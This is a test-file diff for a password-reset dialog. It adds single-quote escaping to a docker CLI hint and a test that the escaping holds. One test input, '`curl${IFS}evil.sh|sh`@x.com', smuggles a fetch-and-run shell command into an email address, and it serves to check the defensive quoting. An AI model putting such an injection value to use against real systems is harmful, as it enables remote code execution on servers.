@@ -6,7 +6,7 @@ import type { Member } from './types'
 const mocks = vi.hoisted(() => ({ post: vi.fn() }))
 vi.mock('@/lib/axios', () => ({ default: { post: mocks.post } }))
 
-import { PasswordResetLinkDialog } from './PasswordResetLinkDialog'
+import { PasswordResetLinkDialog, resetPasswordCommand } from './PasswordResetLinkDialog'
 
 const member: Member = {
   id: 'm2',
@@ -67,7 +67,16 @@ describe('PasswordResetLinkDialog', () => {
     expect(hint).toHaveTextContent(/only the server administrator/i)
     expect(hint).toHaveTextContent(/other organizations/i)
     expect(hint.querySelector('code')).toHaveTextContent(
-      'docker exec -it togglely-backend node dist/cli reset-password bob@example.com'
+      "docker exec -it togglely-backend node dist/cli reset-password 'bob@example.com'"
+    )
+  })
+
+  it('quotes shell metacharacters in the CLI hint email', () => {
+    expect(resetPasswordCommand('`curl${IFS}evil.sh|sh`@x.com')).toBe(
+      "docker exec -it togglely-backend node dist/cli reset-password '`curl${IFS}evil.sh|sh`@x.com'"
+    )
+    expect(resetPasswordCommand("a'b@x.com")).toBe(
+      "docker exec -it togglely-backend node dist/cli reset-password 'a'\\''b@x.com'"
     )
   })
 
